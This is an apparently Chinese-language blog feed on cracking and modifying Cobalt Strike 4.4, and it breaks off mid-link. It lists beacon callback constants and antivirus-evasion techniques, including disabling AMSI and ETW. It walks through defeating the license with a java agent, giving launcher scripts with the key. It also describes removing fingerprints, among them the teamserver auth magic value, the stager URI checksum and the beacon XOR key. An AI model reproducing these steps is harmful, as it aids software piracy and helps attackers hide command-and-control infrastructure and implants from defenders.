class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> beacon;<br><br><span class="hljs-keyword">import</span> common.CommonUtils;<br><span class="hljs-keyword">import</span> common.ReflectiveDLL;<br><span class="hljs-keyword">import</span> common.SleevedResource;<br><span class="hljs-keyword">import</span> pe.PostExObfuscator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Job</span> </span>&#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> CALLBACK_OUTPUT = <span class="hljs-number">0</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> CALLBACK_KEYSTROKES = <span class="hljs-number">1</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> CALLBACK_FILE = <span class="hljs-number">2</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> CALLBACK_SCREENSHOT = <span class="hljs-number">3</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> CALLBACK_CLOSE = <span class="hljs-number">4</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> CALLBACK_READ = <span class="hljs-number">5</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> CALLBACK_CONNECT = <span class="hljs-number">6</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> CALLBACK_PING = <span class="hljs-number">7</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> CALLBACK_FILE_WRITE = <span class="hljs-number">8</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> CALLBACK_FILE_CLOSE = <span class="hljs-number">9</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> CALLBACK_PIPE_OPEN = <span class="hljs-number">10</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> CALLBACK_PIPE_CLOSE = <span class="hljs-number">11</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> CALLBACK_PIPE_READ = <span class="hljs-number">12</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> CALLBACK_POST_ERROR = <span class="hljs-number">13</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> CALLBACK_PIPE_PING = <span class="hljs-number">14</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> CALLBACK_TOKEN_STOLEN = <span class="hljs-number">15</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> CALLBACK_TOKEN_GETUID = <span class="hljs-number">16</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> CALLBACK_PROCESS_LIST = <span class="hljs-number">17</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> CALLBACK_POST_REPLAY_ERROR = <span class="hljs-number">18</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> CALLBACK_PWD = <span class="hljs-number">19</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> CALLBACK_JOBS = <span class="hljs-number">20</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> CALLBACK_HASHDUMP = <span class="hljs-number">21</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> CALLBACK_PENDING = <span class="hljs-number">22</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> CALLBACK_ACCEPT = <span class="hljs-number">23</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> CALLBACK_NETVIEW = <span class="hljs-number">24</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> CALLBACK_PORTSCAN = <span class="hljs-number">25</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> CALLBACK_DEAD = <span class="hljs-number">26</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> CALLBACK_SSH_STATUS = <span class="hljs-number">27</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> CALLBACK_CHUNK_ALLOCATE = <span class="hljs-number">28</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> CALLBACK_CHUNK_SEND = <span class="hljs-number">29</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> CALLBACK_OUTPUT_OEM = <span class="hljs-number">30</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> CALLBACK_ERROR = <span class="hljs-number">31</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> CALLBACK_OUTPUT_UTF8 = <span class="hljs-number">32</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>package beacon 与beacon相关DLL只在客户端保存即可，与beacon执行命令的结果会在服务器存储以及通过广播发给所有用户/也可以指定某个用户。需要二次开发时注意让DLL的执行结果支持返回给指定用户。</p><p>关于Beacon端二开，在看了Majority师傅的CS二开浅析视频后，注意到以下几点。</p><p>静态A.B.U:</p><ul><li>加密</li><li>混淆：导入表、字符串、花指令</li><li>隐写：图片、音频</li></ul><p>动态A.B.U:</p><ul><li>敏感API调用走syscall，参考地狱之门的实现</li><li>内存加载(DarkLoadLibrary)</li><li>内存申请从RWX改成RW -&gt; RX</li><li>ACE(AlternativeShellcodeExec)</li><li>三端分离(加载器、安装器、核心控制端)</li><li>其他的执行方式</li><li>禁止AMSI</li><li>禁止ETW</li></ul><p>推荐用Native(C++、go等)写后渗透模块，比较通用，C#需要对环境进行适配，不是很通用。</p>]]></content>
    
    
    
    <tags>
      
      <tag>二开</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CS魔改与增强</title>
    <link href="/2021/12/02/CS%E9%AD%94%E6%94%B9%E4%B8%8E%E5%A2%9E%E5%BC%BA/"/>
    <url>/2021/12/02/CS%E9%AD%94%E6%94%B9%E4%B8%8E%E5%A2%9E%E5%BC%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="CobaltStrike魔改与增强"><a href="#CobaltStrike魔改与增强" class="headerlink" title="CobaltStrike魔改与增强"></a>CobaltStrike魔改与增强</h2><p>写这篇文档的目的在于记录CS客户端和服务器的魔改过程，因为有些点随着时间的过去会逐渐淡忘，有这么一篇详实的魔改过程记录文档，无疑对团队和个人来说都是件益事。这篇文档将记录CS4.4版本的破解使用，特征消除，功能改造增强的实现过程。</p><h3 id="第一部分-破解使用"><a href="#第一部分-破解使用" class="headerlink" title="第一部分-破解使用"></a>第一部分-破解使用</h3><p>网上已经有人公开了4.4版本的原版jar包和破解方法，见<a href="https://www.ddosi.org/cobaltstrike-4-4-csagent/">CobaltStrike 4.4原版+通用白嫖破解及汉化加载器</a>。对于别人的公开不便评论，原本这个版本的原版jar包应该在一个小圈子里流传，后面被传出来了，也无所谓，反正迟早都要发生的。4.4版本由于class之间有循环校验文件完整性，导致4.3及之前版本的暴力替换class文件的破解方法失效，于是有师傅用java agent注入的形式动态替换内存当中的license实现白嫖。这位师傅就是<a href="https://github.com/Twi1ight">Twi1ight</a>。CSAgent实现了CS 4.X的通杀白嫖，实在牛逼，膜。</p><p>上面是CS4.4相关的有趣故事，接下来是如何使用破解补丁的具体过程。首先clone <a href="https://github.com/Twi1ight/CSAgent">CSAgent</a>到本地，然后IDEA打开。等待IDEA完成项目加载后，点击右侧maven选项，先执行compile，再执行single打包，生成破解补丁jar包。</p><p><img src="/images/%E6%89%A7%E8%A1%8Ccompile%E7%BC%96%E8%AF%91%E6%BA%90%E7%A0%81.png" alt="执行compile编译源码"></p><p><img src="/images/maven%E7%94%9F%E6%88%90jar%E5%8C%85.png" alt="maven生成jar包"></p><p>执行完成后，生成jar包。</p><p><img src="/images/%E7%94%9F%E6%88%90%E7%9A%84jar%E5%8C%85%E6%96%87%E4%BB%B6.png" alt="生成的jar包文件"></p><p>接下来复制一份完整的cs 4.x的目录，重命名为cobaltstrike4.4，然后替换该目录下的cobaltstrike.jar为cs4.4的原版jar包。将上面生成的破解补丁复制到目录下，重命名为CSAgent.jar。</p><p><img src="/images/cs4.4%E7%9A%84%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9.png" alt="cs4.4的目录文件内容"></p><p>替换cobaltstrike、teamserver、agscript、c2lint、cobaltstrike.bat文件中的解密key，cs4.4版本替换后的文件可以从release的1.2版本中下载。</p><figure class="highlight bash"><table><tr><td class="gutter hljs hljs hljs hljs hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Start Cobalt Strike Aggressor Script</span><br><span class="hljs-comment"># 文件 agscript</span><br><br>java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -classpath ./cobaltstrike.jar -javaagent:CSAgent.jar=5e98194a01c6b48fa582a6a9fcbb92d6 -Duser.language=en aggressor.headless.Start $*<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs hljs hljs hljs hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Check a Malleable C&amp;C Profile</span><br><span class="hljs-comment"># 文件 c2lint</span><br><br>java -XX:ParallelGCThreads=4 -XX:+UseParallelGC -classpath ./cobaltstrike.jar -javaagent:CSAgent.jar=5e98194a01c6b48fa582a6a9fcbb92d6 -Duser.language=en c2profile.Lint <span class="hljs-variable">$1</span><br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs hljs hljs hljs hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Start Cobalt Strike Client</span><br><span class="hljs-comment"># 文件 cobaltstrike</span><br><br>java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -javaagent:CSAgent.jar=5e98194a01c6b48fa582a6a9fcbb92d6 -Duser.language=en -jar cobaltstrike.jar $*<br></code></pre></div></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter hljs hljs hljs hljs hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">; 文件 cobaltstrike.bat<br><br>java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -javaagent:CSAgent.jar=5e98194a01c6b48fa582a6a9fcbb92d6 -Duser.language=en -jar cobaltstrike.jar<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs hljs hljs hljs hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Start Cobalt Strike Team Server</span><br><span class="hljs-comment"># 文件 teamserver</span><br><br><span class="hljs-comment"># make pretty looking messages (thanks Carlos)</span><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">print_good</span></span> () &#123;<br>    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\x1B[01;32m[+]\x1B[0m <span class="hljs-variable">$1</span>&quot;</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">print_error</span></span> () &#123;<br>    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\x1B[01;31m[-]\x1B[0m <span class="hljs-variable">$1</span>&quot;</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">print_info</span></span> () &#123;<br>    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\x1B[01;34m[*]\x1B[0m <span class="hljs-variable">$1</span>&quot;</span><br>&#125;<br><br><span class="hljs-comment"># check that we&#x27;re r00t</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$UID</span> -ne 0 ]; <span class="hljs-keyword">then</span><br>print_error <span class="hljs-string">&quot;Superuser privileges are required to run the team server&quot;</span><br><span class="hljs-built_in">exit</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># check if java is available...</span><br><span class="hljs-keyword">if</span> [ $(<span class="hljs-built_in">command</span> -v java) ]; <span class="hljs-keyword">then</span><br><span class="hljs-literal">true</span><br><span class="hljs-keyword">else</span><br>print_error <span class="hljs-string">&quot;java is not in \$PATH&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;    is Java installed?&quot;</span><br><span class="hljs-built_in">exit</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># check if keytool is available...</span><br><span class="hljs-keyword">if</span> [ $(<span class="hljs-built_in">command</span> -v keytool) ]; <span class="hljs-keyword">then</span><br><span class="hljs-literal">true</span><br><span class="hljs-keyword">else</span><br>print_error <span class="hljs-string">&quot;keytool is not in \$PATH&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;    install the Java Developer Kit&quot;</span><br><span class="hljs-built_in">exit</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># generate a certificate</span><br><span class="hljs-comment"># naturally you&#x27;re welcome to replace this step with your own permanent certificate.</span><br><span class="hljs-comment"># just make sure you pass -Djavax.net.ssl.keyStore=&quot;/path/to/whatever&quot; and</span><br><span class="hljs-comment"># -Djavax.net.ssl.keyStorePassword=&quot;password&quot; to java. This is used for setting up</span><br><span class="hljs-comment"># an SSL server socket. Also, the SHA-1 digest of the first certificate in the store</span><br><span class="hljs-comment"># is printed so users may have a chance to verify they&#x27;re not being owned.</span><br><span class="hljs-keyword">if</span> [ -e ./cobaltstrike.store ]; <span class="hljs-keyword">then</span><br>print_info <span class="hljs-string">&quot;Will use existing X509 certificate and keystore (for SSL)&quot;</span><br><span class="hljs-keyword">else</span><br>print_info <span class="hljs-string">&quot;Generating X509 certificate and keystore (for SSL)&quot;</span><br>keytool -keystore ./cobaltstrike.store -storepass Microsoft -keypass Microsoft -genkey -keyalg RSA -<span class="hljs-built_in">alias</span> cobaltstrike -dname <span class="hljs-string">&quot;CN=*.microsoft.com, OU=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=WA, C=US&quot;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># start the team server.</span><br>java -XX:ParallelGCThreads=4 -Dcobaltstrike.server_port=50050 -Dcobaltstrike.server_bindto=0.0.0.0 -Djavax.net.ssl.keyStore=./cobaltstrike.store -Djavax.net.ssl.keyStorePassword=Microsoft -server -XX:+AggressiveHeap -XX:+UseParallelGC -classpath ./cobaltstrike.jar -javaagent:CSAgent.jar=5e98194a01c6b48fa582a6a9fcbb92d6 -Duser.language=en server.TeamServer $*<br></code></pre></div></td></tr></table></figure><p>现在已经破解完成，可以启动teamserver和client查看效果。</p><p><img src="/images/teamserver%E5%90%AF%E5%8A%A8%E6%95%88%E6%9E%9C.png" alt="teamserver启动效果"></p><p><img src="/images/%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2.png" alt="客户端登录界面"></p><p><img src="/images/%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9E%E6%8E%A5%E8%AF%81%E4%B9%A6%E6%8F%90%E7%A4%BA%E7%95%8C%E9%9D%A2.png" alt="客户端连接证书提示界面"></p><p><img src="/images/%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%99%BB%E5%BD%95%E6%88%90%E5%8A%9F%E4%B8%BB%E7%95%8C%E9%9D%A2.png" alt="客户端登录成功主界面"></p><p>生成木马上线测试。</p><p><img src="/images/%E7%94%9F%E6%88%90%E4%B8%8D%E5%88%86%E9%98%B6%E6%AE%B5%E7%9A%84%E6%9C%A8%E9%A9%AC.png" alt="生成不分阶段的木马"></p><p>成功上线。</p><p><img src="/images/%E4%B8%8A%E7%BA%BF%E6%88%90%E5%8A%9F.png" alt="上线成功"></p><p>测试执行命令。</p><p><img src="/images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%88%90%E5%8A%9F.png" alt="命令执行成功"></p><p>可开启汉化选项，复制CSAgent提供的resources和script目录到cs4.4的目录下，关闭客户端重新启动即可汉化。</p><p><img src="/images/CSAgent%E7%9A%84%E6%B1%89%E5%8C%96%E6%95%88%E6%9E%9C.png" alt="CSAgent的汉化效果"></p><h3 id="第二部分-特征消除"><a href="#第二部分-特征消除" class="headerlink" title="第二部分-特征消除"></a>第二部分-特征消除</h3><h4 id="逆向环境搭建"><a href="#逆向环境搭建" class="headerlink" title="逆向环境搭建"></a>逆向环境搭建</h4><ul><li><p>idea pro</p></li><li><p>java-decompiler</p><p>使用idea安装目录下的plugins/java-decompiler/lib/java-decompiler.jar文件反编译cobaltstrike.jar，反编译完成得到cs的java源码，需要注意的是，得到的源码是一个jar的压缩包，解压即可得到源码。</p><figure class="highlight bash"><table><tr><td class="gutter hljs hljs hljs hljs hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">java -cp IDEA_HOME/plugins/java-decompiler/lib/java-decompiler.jar  org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=<span class="hljs-literal">true</span> &lt;src.jar&gt; &lt;dest dir&gt;<br></code></pre></div></td></tr></table></figure></li></ul><p>接下来新建一个IDEA项目，jdk版本选择1.8。</p><p><img src="/images/IDEA%E5%88%9B%E5%BB%BA%E9%A1%B9%E7%9B%AE%E9%80%89%E6%8B%A9%E7%89%88%E6%9C%AC1.8.png" alt="IDEA创建项目选择版本1.8"></p><p>下一步勾选Create Project from template.</p><p><img src="/images/IDEA%E6%A8%A1%E6%9D%BF%E9%80%89%E6%8B%A9.png" alt="IDEA模板选择"></p><p>创建完成项目之后，解压缩源码jar包中的代码到项目的src目录下。完成这些，初步的逆向分析环境就搭建好了。</p><h4 id="teamserver登录接口"><a href="#teamserver登录接口" class="headerlink" title="teamserver登录接口"></a>teamserver登录接口</h4><p>启动CS TeamServer的过程中，会看到其日志打印提示信息</p><p><img src="/images/TeamServer%E6%97%A5%E5%BF%97%E6%89%93%E5%8D%B0%E8%BE%93%E5%87%BA%E6%8F%90%E7%A4%BA%E7%AC%A6.png" alt="TeamServer日志打印输出提示符"></p><figure class="highlight bash"><table><tr><td class="gutter hljs hljs hljs hljs hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">[*] SHA256 <span class="hljs-built_in">hash</span> of SSL cert is: d1a004dba75db4c313f6d6ce33181418112c4186a6cf1c58b4c12bf4a427ba46<br></code></pre></div></td></tr></table></figure><p>可以通过前面的提示信息<code>SHA256 hash of SSL cert is</code>在代码中搜索，定位到TeamServer启动的位置(server/TeamServer/A)。</p><p><img src="/images/TeamServer%E4%BB%A3%E7%A0%81%E5%90%AF%E5%8A%A8%E4%BD%8D%E7%BD%AE.png" alt="TeamServer代码启动位置"></p><p>其中<code>SecureServerSocket var4 = new SecureServerSocket(var3, this.port)</code>这行代码正是简历TCP TLS监听的代码。var3是程序监听的IP地址，如果在启动teamserver时没有指定，那么默认监听绑定的地址就是0.0.0.0。代码接下来便是对新连接的客户端请求进行处理的过程(server/TeamServer/A)。</p><p><img src="/images/%E5%AF%B9%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E8%AF%B7%E6%B1%82%E8%BF%9B%E8%A1%8C%E5%A4%84%E7%90%86%E4%BB%A3%E7%A0%81%E9%83%A8%E5%88%86.png" alt="对客户端的请求进行处理代码部分"></p><p>对于每个连接的客户端请求，都会调用acceptAndAuthenticate方法去验证身份(ssl/SecureServerSocket/acceptAndAuthenticate)。跟进这个方法，继续分析。</p><p><img src="/images/teamserver%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E8%AF%B7%E6%B1%82.png" alt="teamserver服务端身份认证请求"></p><p>最终调用了authenticate方法对新创建的连接进行认证，第一个参数是连接的socket对象，第二个参数是当前服务端设置的连接密码，第三个参数的客户端的IP地址(ssl/SecureServerSocket/authenticate)。跟进该方法，继续分析。</p><p><img src="/images/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%87%BD%E6%95%B0%E5%AE%9E%E7%8E%B0.png" alt="身份认证函数实现"></p><p>首先从socket请求中读取4字节的int型变量。如果读取到的数据与48879相等，那么继续后面的处理过程，否则就直接返回false，身份认证失败，关闭客户端的连接。因此，<code>我们这里可以修改这一字段的值，改为我们自定义的其他值，以避免teamserver口令爆破和指纹识别的风险</code>。</p><p>上面是teamserver端的处理过程，与之相对应的，客户端也有一段登录请求包的构造过程(ssl/SecureSocket/authenticate)，在修改服务端的同时，也要修改客户端，才能在修改完成之后，正常的用户通过修改后的客户端登录。</p><p><img src="/images/%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%8F%91%E5%8C%85%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B.png" alt="客户端发包认证过程"></p><p>设置连接密码为admin123，启动teamserver。使用网上开源的cs登录密码爆破脚本分别爆破修改前和修改后的teamserver。</p><p>修改前的teamserver被爆破出密码为admin123。</p><p><img src="/images/%E4%BF%AE%E6%94%B9%E5%89%8D%E7%9A%84%E7%88%86%E7%A0%B4%E6%88%90%E5%8A%9F%E7%BB%93%E6%9E%9C.png" alt="修改前的爆破成功结果"></p><p>修改后的teamserver无法被爆破出密码。</p><p><img src="/images/%E4%BF%AE%E6%94%B9%E5%90%8E%E7%9A%84teamserver%E5%8F%AF%E9%98%B2%E6%AD%A2%E7%88%86%E7%A0%B4%E5%8F%A3%E4%BB%A4.png" alt="修改后的teamserver可防止爆破口令"></p><p>使用修改后的客户端可正常登录TeamServer。</p><p><img src="/images/%E4%BD%BF%E7%94%A8%E4%BF%AE%E6%94%B9%E5%90%8E%E7%9A%84%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%8F%AF%E6%AD%A3%E5%B8%B8%E7%99%BB%E5%BD%95.png" alt="使用修改后的客户端可正常登录"></p><h4 id="分段beacon下载路径特征"><a href="#分段beacon下载路径特征" class="headerlink" title="分段beacon下载路径特征"></a>分段beacon下载路径特征</h4><p>使用分段的木马上线，木马会请求一个随机URI路径下载第二阶段的beacon文件，这个beacon文件就是CS的控制功能所在。</p><p><img src="/images/%E5%88%86%E6%AE%B5%E6%9C%A8%E9%A9%AC%E4%B8%8B%E8%BD%BD%E6%8E%A7%E5%88%B6%E7%AB%AFbeacon.png" alt="分段木马下载控制端beacon"></p><p>根据网上师傅们分享的URI检测的代码所在位置(cloudstrike/WebServer/checksum8)，按照师傅们提到的，修改这一部分的校验逻辑。</p><p><img src="/images/checksum8%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9.png" alt="checksum8特征修改"></p><p>与之相对应，还需要修改另一处生成stager时获取URI的代码(common/CommonUtils/MSFURI)。</p><p><img src="/images/MSFURI%E7%9A%84%E7%94%9F%E6%88%90%E7%AE%97%E6%B3%95.png" alt="MSFURI的生成算法"></p><p>修改前手动下载beacon文件。</p><p><img src="/images/%E4%B8%8B%E8%BD%BDstager%E6%96%87%E4%BB%B6.png" alt="下载stager文件"></p><p>IDA中可打开查看shellcode内容。</p><p><img src="/images/IDA%E5%8F%8D%E7%BC%96%E8%AF%91stager.png" alt="IDA反编译stager"></p><p>修改后手动下载beacon文件。</p><p><img src="/images/%E4%BF%AE%E6%94%B9URI%E7%89%B9%E5%BE%81%E5%90%8E%E6%89%8B%E5%8A%A8%E4%B8%8B%E8%BD%BDstager%E6%96%87%E4%BB%B6.png" alt="修改URI特征后手动下载stager文件"></p><p>生成默认的分段上线exe，执行上线成功。</p><p><img src="/images/32%E4%BD%8D%E7%A8%8B%E5%BA%8F%E4%B8%8A%E7%BA%BF.png" alt="32位程序上线"></p><p><img src="/images/32%E4%BD%8D%E7%A8%8B%E5%BA%8F%E4%B8%8A%E7%BA%BF%E6%88%90%E5%8A%9F.png" alt="32位程序上线成功"></p><p>64位程序上线成功。</p><p><img src="/images/%E7%94%9F%E6%88%9064%E4%BD%8D%E7%A8%8B%E5%BA%8F.png" alt="生成64位程序"></p><p><img src="/images/64%E4%BD%8D%E7%A8%8B%E5%BA%8F%E4%B8%8A%E7%BA%BF%E6%88%90%E5%8A%9F.png" alt="64位程序上线成功"></p><p>另外还有一种方法，就是在不需要分段模式上线的时候kill掉管理站点下的stager，在需要的时候再开起来，这也是一种规避stager uri扫描的方法。</p><p><img src="/images/%E7%AE%A1%E7%90%86%E7%AB%99%E7%82%B9%E4%B8%8B%E7%9A%84stager%E4%BF%A1%E6%81%AF.png" alt="管理站点下的stager信息"></p><h4 id="修改beacon配置信息的默认密钥"><a href="#修改beacon配置信息的默认密钥" class="headerlink" title="修改beacon配置信息的默认密钥"></a>修改beacon配置信息的默认密钥</h4><p>参考网上其他师傅公开的资料，beacon/BeaconPayload的beacon_obfuscate方法对beacon的配置信息进行了异或混淆，异或的key是固定的，3.x是0x69，4.x为0x2e。</p><p><img src="/images/beacon%E6%B7%B7%E6%B7%86%E5%87%BD%E6%95%B0.png" alt="beacon混淆函数"></p><p>这里的46的16进制就是0x2E。修改完服务端beacon的混淆密钥，与之对应，需要修改sleeve目录下的dll文件。这些DLL文件默认是加密的，使用<a href="https://github.com/ca3tie1">ca3tie1</a>师傅开发的**<a href="https://github.com/ca3tie1/CrackSleeve"> 